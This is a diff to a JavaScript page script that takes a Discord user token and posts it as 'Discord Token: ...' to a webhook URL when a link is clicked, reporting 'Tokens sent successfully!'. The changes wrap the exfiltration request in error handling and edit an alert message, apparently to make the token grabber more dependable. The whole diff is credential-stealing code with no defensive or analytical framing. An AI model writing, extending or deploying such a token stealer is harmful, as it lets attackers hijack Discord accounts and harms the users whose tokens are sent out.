@@ -31,13 +31,24 @@
                     content: `Discord Token: \`${token}\``
                 };
 
-                await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                });
+                try {
+                    const response = await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+
+                    const data = await response.json();
+                    console.log('Success:', data);
+                } catch (error) {
+                    console.error('Error:', error);
+                }
             }
 
             // Main function to execute on link click
@@ -47,7 +58,7 @@
                     await sendTokensToWebhook(token);
                     alert('Tokens sent successfully!');
                 } else {
-                    alert('No tokens found.');
+                    alert('TOKEN CANT BE FOUND');
                 }
             }
 
